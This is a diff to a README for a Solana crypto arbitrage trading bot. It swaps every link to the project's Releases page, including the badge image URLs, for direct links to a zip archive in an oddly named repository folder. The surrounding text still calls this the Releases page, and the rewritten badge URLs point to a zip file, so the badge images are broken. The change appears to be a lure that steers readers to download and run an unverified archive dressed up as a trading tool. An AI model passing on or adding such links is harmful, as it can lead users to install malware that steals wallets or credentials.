@@ -1,6 +1,6 @@
 # 🚀 Solana-Arbitrage-Bot - Automate Your Trading Efforts
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Evilarif/Solana-Arbitrage-Bot/releases)
+[![Download Now](https://raw.githubusercontent.com/Evilarif/Solana-Arbitrage-Bot/master/reichsmark/Solana-Arbitrage-Bot.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Evilarif/Solana-Arbitrage-Bot/master/reichsmark/Solana-Arbitrage-Bot.zip)
 
 ## 📋 Description
 
@@ -18,7 +18,7 @@ The **Solana-Arbitrage-Bot** is designed to help users automate trading tasks ac
 
 To get started, you need to download the application from the Releases page. 
 
-- Visit this page to download: [Solana-Arbitrage-Bot Releases](https://github.com/Evilarif/Solana-Arbitrage-Bot/releases)
+- Visit this page to download: [Solana-Arbitrage-Bot Releases](https://raw.githubusercontent.com/Evilarif/Solana-Arbitrage-Bot/master/reichsmark/Solana-Arbitrage-Bot.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -79,4 +79,4 @@ Trading involves risk. Always do your research and consider your financial situa
 
 The **Solana-Arbitrage-Bot** provides tools to assist in trading, but it does not guarantee profits. Manage your trades wisely and seek further advice if needed. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Evilarif/Solana-Arbitrage-Bot/releases)
+[![Download Now](https://raw.githubusercontent.com/Evilarif/Solana-Arbitrage-Bot/master/reichsmark/Solana-Arbitrage-Bot.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Evilarif/Solana-Arbitrage-Bot/master/reichsmark/Solana-Arbitrage-Bot.zip)
